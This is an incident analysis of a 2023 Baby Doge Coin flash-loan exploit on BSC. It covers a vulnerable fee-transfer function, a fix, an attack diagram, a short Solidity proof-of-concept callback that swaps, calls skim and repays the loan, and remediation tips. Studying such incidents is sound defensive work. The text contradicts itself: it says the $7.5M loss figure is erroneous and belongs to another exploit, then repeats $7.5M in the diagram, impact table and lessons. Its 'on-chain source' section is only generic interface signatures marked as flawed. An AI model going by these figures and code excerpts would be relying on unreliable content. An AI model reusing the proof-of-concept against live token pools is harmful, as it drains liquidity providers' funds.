# BabyDogeCoin — Flash Loan Fee Mechanism Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2023-05-07 |
| **Protocol** | Baby Doge Coin |
| **Chain** | BSC |
| **Loss** | ~$135,000–$157,000 (actual attacker profit from fee-skim; the $7.5M figure circulated erroneously and belongs to the JimbosProtocol exploit on May 28, 2023) |
| **Attacker** | [0xcbc0d0c1...](https://bscscan.com/address/0xcbc0d0c1049eb011d7c7cfc4ff556d281f0afebb) |
| **Attack Tx** | [0x098e7394...](https://bscscan.com/tx/0x098e7394a1733320e0887f0de22b18f5c71ee18d48a0f6d30c76890fb5c85375) |
| **Vulnerable Contract** | [0xc748673057...](https://bscscan.com/address/0xc748673057861a797275cd8a068abb95a902e8de) |
| **Root Cause** | Fee mechanism directly modifies LP pair balance, causing reserve desynchronization |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-05/BabyDogeCoin_exp.sol) |

---
## 1. Vulnerability Overview

Baby Doge Coin has a mechanism that distributes a portion of transaction fees directly to the LP pair. This fee distribution modifies the LP pair's actual token balance, but the UniswapV2 reserves are not updated, causing a desynchronization. The attacker used a PancakeSwap flash loan to swap a large amount of BabyDoge tokens, then extracted the LP imbalance created by the fee via `skim`.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable fee distribution (directly increases LP balance)
function _transfer(address sender, address recipient, uint256 amount) internal {
    uint256 fee = amount * feeRate / 100;
    // ❌ Fee is transferred directly to the LP pair
    _balances[address(lpPair)] += fee;
    // ❌ No lpPair.sync() → reserve and actual balance are out of sync
    _balances[sender] -= amount;
    _balances[recipient] += (amount - fee);
}

// ✅ Fix
function _transfer(address sender, address recipient, uint256 amount) internal {
    uint256 fee = amount * feeRate / 100;
    _balances[address(lpPair)] += fee;
    IUniswapV2Pair(lpPair).sync();  // ✅ Synchronize reserves
    _balances[sender] -= amount;
    _balances[recipient] += (amount - fee);
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: CoinToken.sol
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

// ...

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);  // ❌

// ...

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);  // ❌

// ...

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);  // ❌

// ...

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);  // ❌
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ PancakeSwap Flash Loan (large amount of WBNB)
  │
  ├─2─▶ Swap WBNB → BabyDoge
  │       Fee → LP pair balance increases, reserves not updated
  │
  ├─3─▶ BabyDoge-WBNB LP.skim(attacker)
  │       LP actual balance > reserves → excess WBNB withdrawn
  │
  ├─4─▶ Swap BabyDoge → WBNB (reverse swap)
  │
  └─5─▶ Repay flash loan → ~7.5M USD net profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function pancakeCall(address, uint256 wbnbAmount, uint256, bytes calldata) external {
    // 1. Buy BabyDoge with large amount of WBNB (fee → LP imbalance)
    swapWBNBtoBabyDoge(wbnbAmount);

    // 2. Extract excess WBNB via skim on LP imbalance
    babyDogeWbnbPair.skim(address(this));

    // 3. Swap remaining BabyDoge → WBNB
    swapBabyDogetoWBNB(babyDoge.balanceOf(address(this)));

    // 4. Repay flash loan and retain profit
    IERC20(wbnb).transfer(address(babyDogeWbnbPair), wbnbAmount + fee);
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Fee distribution mechanism flaw |
| **Attack Vector** | Flash Loan + LP fee + skim() |
| **Impact Scope** | LP liquidity providers (~7.5M USD) |
| **DASP Classification** | Business Logic Flaw |
| **CWE** | CWE-682: Incorrect Calculation |

## 6. Remediation Recommendations

1. **sync() after fee transfer**: Immediately synchronize reserves after transferring fees to the LP.
2. **Fee accumulation approach**: Accumulate fees in a separate contract rather than distributing them directly to the LP.
3. **Disable skim()**: Disable or restrict access to the `skim` function on the LP pair.

## 7. Lessons Learned

- The $7.5M USD loss is one of the largest among incidents of this vulnerability pattern.
- BabyDogeCoin was attacked twice — in May (exp1) and June (exp2, BabyDogeCoin02).
- Fee distribution mechanisms must always account for synchronization with LP reserves.